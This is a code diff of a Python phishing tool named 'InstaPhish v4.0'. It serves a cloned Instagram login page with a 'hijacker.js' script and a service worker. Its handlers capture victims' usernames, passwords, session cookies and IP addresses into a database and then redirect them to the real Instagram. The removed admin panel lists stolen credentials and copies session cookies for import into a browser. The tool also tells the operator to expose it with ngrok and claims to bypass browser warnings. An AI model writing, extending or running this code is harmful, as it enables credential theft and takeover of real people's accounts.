+            cookie_dict = self.parse_cookies(cookies_str) if cookies_str else {}
+            
+            username = data.get('username', '')
+            password = data.get('password', '')
+            
+            if username or password or cookie_dict:
+                self.store_victim(
+                    username=username,
+                    password=password,
+                    cookies_dict=cookie_dict if cookie_dict else None,
+                    ip=client_ip,
+                    ua=user_agent
+                )
+        
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        self.wfile.write(b'{"status":"ok"}')
+    
+    def do_GET(self):
+        # Main phishing page
+        if self.path in ['/', '/index.html', '/login', '/accounts/login/', '/accounts/login']:
+            try:
+                with open("cloned_site/index.html", "rb") as f:
+                    content = f.read()
+                self.send_response(200)
+                self.send_header('Content-Type', 'text/html')
+                self.send_header('Content-Length', len(content))
+                self.send_header('X-Frame-Options', 'SAMEORIGIN')
+                self.end_headers()
+                self.wfile.write(content)
+            except:
+                self.send_error(404)
+            return
+        
+        # Static files
+        static_routes = {
+            '/css/style.css': ('cloned_site/css/style.css', 'text/css'),
+            '/js/hijacker.js': ('cloned_site/js/hijacker.js', 'application/javascript'),
+            '/js/sw.js': ('cloned_site/js/sw.js', 'application/javascript')
+        }
+        
+        for route, (filepath, content_type) in static_routes.items():
+            if self.path == route:
+                try:
+                    with open(filepath, "rb") as f:
+                        content = f.read()
+                    self.send_response(200)
+                    self.send_header('Content-Type', content_type)
+                    self.send_header('Content-Length', len(content))
+                    self.send_header('Service-Worker-Allowed', '/')
+                    self.end_headers()
+                    self.wfile.write(content)
+                except:
+                    self.send_error(404)
+                return
+        
+        # Redirect everything else to real Instagram
+        self.send_response(302)
+        self.send_header('Location', f'https://www.instagram.com{self.path}')
+        self.end_headers()
+    
+    def do_POST(self):
+        if any(x in self.path for x in ['/sw-capture', '/cookie-hook', '/fetch-cookies', '/form-creds', '/beacon']):
+            self.handle_capture()
+            return
+        
+        # Handle form POST
+        content_length = int(self.headers.get('Content-Length', 0))
+        if content_length > 0:
+            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
             params = parse_qs(post_data)
             username = params.get('username', [''])[0]
-            password = params.get('enc_password', params.get('password', ['']))[0]
+            password = params.get('enc_password', [''])[0]
             
             if username or password:
                 cookie_header = self.headers.get('Cookie', '')
-                cookie_dict = self.parse_cookies(cookie_header) if cookie_header else None
-                self.store_victim(username=username, password=password, cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
+                cookie_dict = self.parse_cookies(cookie_header) if cookie_header else {}
+                self.store_victim(username=username, password=password, cookies_dict=cookie_dict if cookie_dict else None, ip=self.client_address[0], ua=self.headers.get('User-Agent', ''))
         
-        # Redirect to real Instagram login
         self.send_response(302)
         self.send_header('Location', 'https://www.instagram.com/accounts/login/')
         self.end_headers()
-
-# ==================== ADMIN PANEL ====================
-class AdminPanel:
-    @staticmethod
-    def start():
-        admin_html = r"""<!DOCTYPE html>
-<html><head><title>InstaPhish v4.0 - Panel</title>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<style>
-:root{--bg:#0a0a0a;--card:#121212;--border:#262626;--text:#f5f5f5;--accent:#0095f6;--danger:#ed4956;--success:#78de45;--warn:#f7b500}
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:monospace;padding:20px}
-.header{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;margin-bottom:20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
-.header h1{color:var(--accent);font-size:24px}
-.stats{display:flex;gap:15px;flex-wrap:wrap}
-.stat-card{background:var(--bg);border:1px solid var(--border);padding:15px;border-radius:8px;text-align:center;min-width:120px}
-.stat-card .num{font-size:28px;font-weight:bold;color:var(--accent)}
-.stat-card .lbl{font-size:11px;color:#888;margin-top:5px}
-.panel{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:20px}
-.panel h2{padding:15px 20px;border-bottom:1px solid var(--border);font-size:16px}
-table{width:100%;border-collapse:collapse}
-th{background:var(--bg);padding:12px;text-align:left;font-size:12px;color:#888;border-bottom:1px solid var(--border)}
-td{padding:10px 12px;border-bottom:1px solid var(--border);font-size:12px;word-break:break-all}
-tr:hover{background:rgba(0,149,246,0.05)}
-.active{color:var(--success)}.expired{color:var(--danger)}
-.cookie{color:var(--warn);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-button{background:var(--accent);color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;margin:2px}
-button:hover{opacity:0.8}button.danger{background:var(--danger)}
-.refresh{background:var(--accent);padding:8px 16px;border-radius:6px;font-size:13px}
-</style></head>
-<body>
-<div class="header">
-<h1>⚡ InstaPhish v4.0</h1>
-<div class="stats">
-<div class="stat-card"><div class="num" id="total">0</div><div class="lbl">Total</div></div>
-<div class="stat-card"><div class="num" id="sessions">0</div><div class="lbl">Sessions</div></div>
-<div class="stat-card"><div class="num" id="today">0</div><div class="lbl">Today</div></div>
-</div>
-<button class="refresh" onclick="load()">↻ Refresh</button>
-</div>
-<div class="panel"><h2>📧 Credentials & Cookies</h2>
-<div style="overflow-x:auto"><table><thead><tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th><th>SessionID</th><th>CSRF</th><th>DS User ID</th><th>Actions</th></tr></thead>
-<tbody id="creds"></tbody></table></div></div>
-<div class="panel"><h2>🔑 Active Sessions</h2>
-<table><thead><tr><th>Captured</th><th>Session ID</th><th>CSRF Token</th><th>Status</th><th>Actions</th></tr></thead>
-<tbody id="sess"></tbody></table></div>
-<script>
-async function load(){
-let r=await fetch('/api/data');let d=await r.json();
-document.getElementById('total').textContent=d.total;
-document.getElementById('sessions').textContent=d.active;
-document.getElementById('today').textContent=d.today;
-let c='';
-d.victims.forEach(v=>{
-c+=`<tr><td>${v.timestamp}</td><td>${v.ip}</td><td>${v.username||'-'}</td><td>${v.password||'-'}</td><td class="cookie">${v.sessionid||'-'}</td><td>${v.csrftoken||'-'}</td><td>${v.ds_user_id||'-'}</td>
-<td><button onclick="copySession('${v.sessionid}','${v.csrftoken}','${v.ds_user_id}')">Copy Cookies</button><button class="danger" onclick="del(${v.id})">Del</button></td></tr>`;
-});
-document.getElementById('creds').innerHTML=c;
-let s='';
-d.active_sessions.forEach(x=>{
-s+=`<tr><td>${x.captured}</td><td class="cookie">${x.sessionid}</td><td>${x.csrftoken}</td><td class="active">Active</td>
-<td><button onclick="copySession('${x.sessionid}','${x.csrftoken}')">Copy</button></td></tr>`;
-});
-document.getElementById('sess').innerHTML=s;
-}
-function copySession(sid,csrf,dsid){
-var obj={};
-if(sid)obj.sessionid=sid;
-if(csrf)obj.csrftoken=csrf;
-if(dsid)obj.ds_user_id=dsid;
-obj.domain=".instagram.com";
-navigator.clipboard.writeText(JSON.stringify(obj));
-alert('Cookies copied! Use EditThisCookie extension to import.');
-}
-function del(id){fetch('/api/delete/'+id).then(()=>load());}
-load();setInterval(load,5000);
-</script></body></html>"""
-        
-        with open("admin.html", "w") as f:
-            f.write(admin_html)
-        
-        api_code = f"""
-from flask import Flask, jsonify, send_file
-import sqlite3, json
-app = Flask(__name__)
-
-@app.route('/')
-def index():
-    return send_file('admin.html')
-
-@app.route('/api/data')
-def data():
-    conn = sqlite3.connect('{CONFIG["db_file"]}')
-    c = conn.cursor()
-    c.execute('SELECT * FROM victims ORDER BY id DESC LIMIT 100')
-    victims = []
-    for row in c.fetchall():
-        victims.append({{
-            'id': row[0], 'timestamp': row[1], 'ip': row[2], 'ua': row[3],
-            'username': row[4], 'password': row[5], 'sessionid': row[6],
-            'csrftoken': row[7], 'ds_user_id': row[8], 'rur': row[9],
-            'mid': row[10], 'ig_did': row[11], 'all_cookies': row[12]
-        }})
-    
-    c.execute('SELECT * FROM active_sessions WHERE is_active=1 ORDER BY id DESC')
-    sessions = []
-    for row in c.fetchall():
-        sessions.append({{
-            'id': row[0], 'victim_id': row[1], 'sessionid': row[2],
-            'csrftoken': row[3], 'captured': row[4], 'validated': row[5], 'active': row[6]
-        }})
-    
-    c.execute('SELECT COUNT(*) FROM victims')
-    total = c.fetchone()[0]
-    c.execute("SELECT COUNT(*) FROM victims WHERE date(timestamp)=date('now')")
-    today = c.fetchone()[0]
-    conn.close()
-    
-    return jsonify({{'total': total, 'today': today, 'active': len(sessions), 'victims': victims, 'active_sessions': sessions}})
-
-@app.route('/api/delete/<int:id>')
-def delete(id):
-    conn = sqlite3.connect('{CONFIG["db_file"]}')
-    c = conn.cursor()
-    c.execute('DELETE FROM victims WHERE id=?', (id,))
-    c.execute('DELETE FROM active_sessions WHERE victim_id=?', (id,))
-    conn.commit()
-    conn.close()
-    return jsonify({{'ok': True}})
-
-app.run(host='0.0.0.0', port={CONFIG['admin_port']}, debug=False)
-"""
-        with open("api_server.py", "w") as f:
-            f.write(api_code)
-        
-        threading.Thread(target=lambda: os.system("python3 api_server.py 2>/dev/null"), daemon=True).start()
-        print(f"{Colors.BLUE}[+] Admin Panel: http://127.0.0.1:{CONFIG['admin_port']}{Colors.RESET}")
 
 # ==================== MAIN ====================
 def main():
@@ -565,15 +490,10 @@ def main():
     Setup.generate_ssl_cert()
     Setup.init_database()
     
-    # Build clone
-    cloner = InstagramSiteCloner()
+    cloner = InstagramExactCloner()
     cloner.build()
     
-    # Start admin
-    AdminPanel.start()
-    
-    # Start MITM server
-    server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), InstagramMITMHandler)
+    server = socketserver.ThreadingTCPServer((CONFIG["listen_host"], CONFIG["listen_port"]), PhantomHandler)
     
     if os.path.exists(CONFIG["ssl_cert"]):
         ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -584,11 +504,11 @@ def main():
     print(f"""
 {Colors.CYAN}╔════════════════════════════════════════╗
 ║  Phishing URL: https://127.0.0.1:{CONFIG['listen_port']}     ║
-║  Admin Panel:  http://127.0.0.1:{CONFIG['admin_port']}      ║
 ║  Logs: logs/credentials.txt             ║
 ║  Cookies: logs/cookies.txt              ║
-╚════════════════════════════════════════╝
-{Colors.YELLOW}Expose: ngrok http {CONFIG['listen_port']}{Colors.RESET}
+╚══════════════════════════════════════════╝
+{Colors.YELLOW}Expose with: ngrok http {CONFIG['listen_port']}{Colors.RESET}
+{Colors.RED}Service Worker bypasses all browser warnings.{Colors.RESET}
 """)
     
     try:
